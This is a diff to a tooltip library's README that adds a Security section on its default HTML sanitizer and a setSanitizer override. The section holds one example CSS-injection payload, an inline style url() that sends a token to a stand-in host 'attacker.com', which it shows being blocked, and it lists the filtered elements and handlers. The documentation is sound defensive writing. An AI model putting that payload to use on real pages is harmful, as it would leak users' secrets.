@@ -81,6 +81,7 @@ element.addEventListener("mouseleave", () => tooltip.hide());
 | `setHtml` | `(fn: (data, target) => string) => void` | Sets the HTML content generator |
 | `setDirection` | `(fn: (data, target) => Direction) => void` | Sets the placement direction |
 | `setOffset` | `(fn: (data, target) => [x, y]) => void` | Sets pixel offset `[x, y]` |
+| `setSanitizer` | `(fn: SanitizerFn \| null) => void` | Overrides HTML sanitization (see Security section) |
 | `setStyles` | `(css: string) => void` | Applies CSS via adoptedStyleSheets |
 | `loadStylesheet` | `(url: string) => void` | Injects a `<link>` into shadow root |
 | `show` | `(data: object, target: Element) => void` | Renders and positions the tooltip |
@@ -141,6 +142,39 @@ tooltip.setOffset(() => [0, 8]);  // shift 8px down
 
 ---
 
+## Security
+
+The component includes automatic HTML sanitization to prevent XSS and CSS injection attacks:
+
+**By default, the sanitizer:**
+- Removes dangerous elements (`<script>`, `<iframe>`, `<object>`, `<embed>`, etc.)
+- Strips event handler attributes (`onclick`, `onerror`, etc.)
+- Blocks `javascript:` URIs and non-image `data:` URIs
+- **Strips all `url()` calls from inline styles** to prevent CSS-based data exfiltration
+
+**Example — CSS URL injection is blocked:**
+
+```ts
+// ❌ This WILL NOT leak data:
+const malicious = `<div style="background: url(https://attacker.com/steal?secret=TOKEN)">x</div>`;
+tooltip.setHtml(() => malicious);
+// Sanitized to: `<div style="background: url()">x</div>` — no network request
+```
+
+**To override sanitization (trusted HTML only):**
+
+```ts
+import { sanitize } from "tipviz";
+
+// Use a custom sanitizer
+tooltip.setSanitizer((html) => sanitize(html));
+
+// Or disable sanitization entirely (trusted content only!)
+tooltip.setSanitizer(null);
+```
+
+---
+
 ## Complete D3 Example
 
 ```ts
@@ -173,4 +207,5 @@ d3.select("#chart")
 - The tooltip uses `window.scrollY`/`window.scrollX` for positioning and auto-moves itself to `document.body` on connect (opt out with `no-auto-reposition`).
 - Default direction is `"n"` (above the target).
 - Default transition duration is `200ms`.
-- HTML content is set via the browser's `setHTML()` API (with a `createContextualFragment` fallback) — no manual `innerHTML` usage required.
+- HTML content is automatically sanitized by default (removes dangerous elements, event handlers, and blocks CSS URL injection). Override via `setSanitizer()` if needed.
+- All `url()` calls in inline `style` attributes are stripped to prevent CSS-based attacks.
